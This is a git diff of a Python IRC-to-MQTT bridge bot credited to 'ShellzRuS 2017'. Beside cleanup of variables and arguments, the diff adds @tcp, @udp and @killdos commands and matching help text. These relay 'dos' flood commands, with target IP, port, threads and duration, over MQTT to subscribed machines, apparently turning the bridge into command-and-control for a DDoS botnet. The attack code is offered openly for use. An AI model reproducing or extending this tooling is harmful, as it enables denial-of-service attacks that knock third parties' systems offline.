@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/python
 # -*- coding: utf-8 -*-
 print("""
                                               _..._     
@@ -18,44 +18,20 @@ print("""
                    ~ MqTT-IRC Bridge ~
                        ShellzRuS 2017
 """)
-import sys,socket,string,time,re,binascii,base64,operator,json,argparse
+import socket,string,time,re,binascii,base64,operator,json,argparse,sys
 import paho.mqtt.client as mqtt
 import paho.mqtt.publish as publish
-
-global mq_host
-global mq_port
-global sub_topic
-global pub_topic
-global mq_user
-global mq_pass
-
-global irc_host
-global irc_port
-global irc_nick
-global irc_chan
-global debug
-
 # version of this bot
-bot_version = "1.0 (alpha)"
-
-CHANNEL=""
-CHANNEL_=""
-NICK=""
+bot_version = "1.1 Alpha"
+# initialize some vars
+CHANNEL="";CHANNEL_="";NICK="";HOST=""
+PORT='';pong_once='';priv_user="";data = ''
+client="";userdata="";msg=""
+# irc user stuff
 IDENT="mqirc"
 REALNAME="mqirc"
-HOST=""
-PORT=''
-pong_once=''
-priv_user=""
-data = ''
-client=""
-userdata=""
-msg=""
 sent_m=False
-#irc_auth=""
-a=""
-b=""
-c=""
+
 
 def isAscii(s):
     return all(ord(c) < 128 for c in s)
@@ -81,8 +57,7 @@ def urlsafe_b64decode(s):
           return base64.b64decode(s)
 
 def parse_message(s):
-    """Breaks a message from an IRC server into its prefix, command, and arguments.
-    """
+#Breaks a message from an IRC server into its prefix, command, and arguments.
     prefix = ''
     trailing = []
     if not s:
@@ -140,9 +115,9 @@ def on_message(client, userdata, msg):
                 s.send("PRIVMSG %s :%s %s \n" %(CHANNEL, parsed_ip, parsed_msg))
 
 def handle_message(a, b, c):
+    global sent_m
     global tcount
     global rcount
-    global sent_m
     if not sent_m:
         tcount=0
         rcount=0
@@ -217,24 +192,8 @@ def part_chan(CHANNEL_):
 
 def quit_irc(sender_):
     s.send("PRIVMSG %s :Shutting down... \r\n" % sender_)
-    s.send("QUIT : Peace out!")
+    s.send("QUIT : Peace out!\r\n")
     sys.exit(0)
-
-def bot_usage(action, sender):
-    if debug:
-        print("Sending as : %s " % action)
-    s.send("%s %s : ======== MQIRC Version %s Bot Commands ========: \r\n" %(action, sender,bot_version))
-    s.send("%s %s : Bot responds to the following commands: \r\n" % (action, sender))
-    s.send("%s %s : @cmd <message> : Send a message to pubtopic \r\n" % (action, sender))
-    s.send("%s %s : @help : Show this help \r\n" % (action, sender))
-    s.send("%s %s : @die : Shut down bot \r\n" % (action, sender))
-    s.send("%s %s : @echo <string>: Echo a message\r\n" %(action, sender))
-    s.send("%s %s : ======== IRC Commands ========:\r\n" %(action, sender))
-    s.send("%s %s : @irc : <command> : Send a raw irc command to server\r\n" % (action, sender))
-    s.send("%s %s : @register <password> <email> : Register bot with nickserv\r\n" %(action, sender))
-    s.send("%s %s : @join : <channel> : Join this channel\r\n" % (action, sender))
-    s.send("%s %s : @part : <channel> : Leave this channel\r\n" % (action, sender))
-
 
 def register(final, sender_):
     print("Registering with nickserv...")
@@ -260,13 +219,32 @@ def getchannel(data):                       # Return Channel
     return channel
 
 
+def bot_usage(action, sender):
+    if debug:
+        print("Sending as : %s " % action)
+    s.send("%s %s : ======== MQIRC Version %s Bot Commands ========: \r\n" %(action, sender,bot_version))
+    s.send("%s %s : Bot responds to the following commands: \r\n" % (action, sender))
+    s.send("%s %s : @cmd <message> : Send a message to pubtopic \r\n" % (action, sender))
+    s.send("%s %s : @help : Show this help \r\n" % (action, sender))
+    s.send("%s %s : @die : Shut down bot \r\n" % (action, sender))
+    s.send("%s %s : @echo <string> : Echo a message\r\n" % (action, sender))
+    s.send("%s %s : ======== IRC Commands ========:\r\n" %(action, sender))
+    s.send("%s %s : @irc : <command> : Send a raw irc command to server\r\n" % (action, sender))
+    s.send("%s %s : @register <password> <email> : Register bot with nickserv\r\n" %(action, sender))
+    s.send("%s %s : @join : <channel> : Join this channel\r\n" % (action, sender))
+    s.send("%s %s : @part : <channel> : Leave this channel\r\n" % (action, sender))
+    s.send("%s %s : ======== DDOS Commands ========: \r\n" % (action, sender))
+    s.send("%s %s : @tcp <ip> <port> <threads> <secs> : tcp ddos attack\r\n" % (action, sender))
+    s.send("%s %s : @udp <ip> <port> <threads> <secs> : tcp udp attack\r\n" % (action, sender))
+    s.send("%s %s : @killdos : Kill all running attacks\r\n" % (action, sender))
+
 #### Listen for incoming data
 def listen_irc(irc_auth,chan_key):
+    global scount
     readbuffer=""
     scount=0
     pong_once=0
-    while 1:
-        
+    while True:        
         readbuffer=readbuffer+s.recv(1000000)  
         temp=string.split(readbuffer, "\n")
         rawbuffer=readbuffer
@@ -280,12 +258,13 @@ def listen_irc(irc_auth,chan_key):
             res = parse_message(str(line))
             final = ''
             for i in range(3, len(res)):
-                final = final + str(res[i])
-                final = final.replace("'", "") # gross hacks
-                final = final.replace(",", " ")
+                #print str(res[i])
+                final = final + str(res[i])                
+                final = final[:-2]
+                final = final.replace("'","")
+                final = final + " "
             if debug:
                 print("\n%s\n" % final)
-            final = final[:-1]
 
             if(line[0]=="PING"):
                 if verbose:
@@ -314,10 +293,7 @@ def listen_irc(irc_auth,chan_key):
                 if re.match(r'^:@cmd.*$', line[3]):
                     scount+=1
                     print("Messages sent: %s" % scount)
-                    if verbose or debug:
-                        print("Received a command")
-                    if debug or verbose:
-                        print(final)
+                    if verbose:
                         print("Publishing message")
                     if debug:
                         print("Parsing message with contents: \r\n %s " % final)
@@ -364,39 +340,74 @@ def listen_irc(irc_auth,chan_key):
                     if verbose:
                         print("Sending usage\n")
                     bot_usage(action, sender)
+                elif re.match(r'^:@stats.*$',line[3]):
+                    bot_status(action,sender)
                 elif re.match(r'^:@die.*$', line[3]):
                     if verbose:
                         print("Shutting down...")
                     quit_irc(sender)
-                
+                # ddos commands
+                elif re.match(r'^:@tcp.*$', line[3]):
+                    if debug or verbose:
+                        print("Received tcp dos command: %s from %s" % (final,sender))
+                    try:
+                        mqsend("dos -t %s >/dev/null 2>&1" % final)
+                    except Exception as e:
+                        s.send("%s %s :Error publishing message\n" % (action,sender))
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
+                elif re.match(r'^:@udp.*$', line[3]):
+                    if debug or verbose:
+                        print("Received udp dos command: %s from %s" % (final,sender))
+                    try:
+                        mqsend("dos -u %s >/dev/null 2>&1" % final)
+                    except Exception as e:
+                        s.send("%s %s :Error publishing message\n" % (action,sender))
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
+                elif re.match(r'^:@killdos.*$', line[3]):
+                    if verbose or debug:
+                        print("Received a kill from %s, killing all attacks" % sender)
+                    s.send("%s %s :Killing all attacks \n" % (action,sender))
+                    try:
+                        mqsend("dos -k >/dev/null 2>&1")
+                    except Exception as e:
+                        s.send("%s %s :Error publishing message\n" % (action,sender))
+                        if verbose:
+                            print("Failed to publish message!")
+                        if debug:
+                            print("Error:\n %s" % e)
                 else:
                     pass
       
 
 
 parser = argparse.ArgumentParser()
+# mqtt options
 parser.add_argument('-m','--mq_host',default='localhost', help='Mqtt host to connect to')
 parser.add_argument('-p','--mq_port',default='1883', help='Mqtt port to connect to')
 parser.add_argument('-u','--mq_user',default='user', help='Mqtt user to auth with')
-parser.add_argument('-P','--mq_pass',default='pass', help='Mqtt password to authenticate with')
-parser.add_argument('-s','--mq_subtop',default='input', help='Mqtt topic to subscribe to')
-parser.add_argument('-t','--mq_pubtop',default='output', help='Mqtt topic to publish to')
+parser.add_argument('-P','--mq_pass',default='passwd', help='Mqtt password to authenticate with')
+parser.add_argument('-s','--mq_subtop',default='in', help='Mqtt topic to subscribe to')
+parser.add_argument('-t','--mq_pubtop',default='out', help='Mqtt topic to publish to')
+parser.add_argument('-b','--base64_on', nargs='?', default=False, help='Base64')
+# irc options
 parser.add_argument('-i','--irc_host',default='localhost', help='Irc host to connect to')
 parser.add_argument('-I','--irc_port',default='6667', help='Irc port to connect to')
 parser.add_argument('-n','--irc_nick',default='mqirc', help='Nick of irc user')
 parser.add_argument('-c','--irc_chan',default='#mqtt', help='Irc channel to join')
 parser.add_argument('-k','--chan_key',default='lolololol', help='Channel key')
 parser.add_argument('-a','--irc_auth',default='empty', help='Password to auth with nickserv')
-
 parser.add_argument('-U','--priv_user',default='user', help='Irc bot owner')
+parser.add_argument('-N','--notice', nargs='?', default=False, help='Respond to notices')
+# verbosity options
 parser.add_argument('-d','--debug', nargs='?', default=False, help='Print debug messages')
 parser.add_argument('-v','--verbose', nargs='?', default=False, help='Verbose mode')
 parser.add_argument('-vv','--very_verbose', nargs='?', default=False, help='Very Verbose mode: Print all raw output')
-
-parser.add_argument('-b','--base64_on', nargs='?', default=False, help='Base64')
-parser.add_argument('-N','--notice', nargs='?', default=False, help='Respond to notices')
-
-
 
 ns = parser.parse_args()
 
@@ -416,7 +427,6 @@ priv_user = ns.priv_user if ns.priv_user is not None else "default_priv_user"
 debug = ns.debug if ns.debug is not None else "default_debug"
 verbose = ns.verbose if ns.verbose is not None else "default_verbose"
 very_verbose = ns.very_verbose if ns.very_verbose is not None else "default_very_verbose"
-
 base64_on = ns.base64_on if ns.base64_on is not None else "default_base64_on"
 notice = ns.notice if ns.notice is not None else "default_notice"
 
@@ -453,7 +463,6 @@ if verbose:
     print("IRC Info: %s@%s:%s:%s, owner nick: %s" %(NICK, HOST, PORT, CHANNEL, priv_user))
     print("MQTT Info: %s@%s:%s, subscribe to: %s, publish to: %s " % (mq_user, mq_host, mq_port, mq_subtop, mq_pubtop))
     print("Connecting to ircd...")
-
 
 try:
     s=socket.socket( )
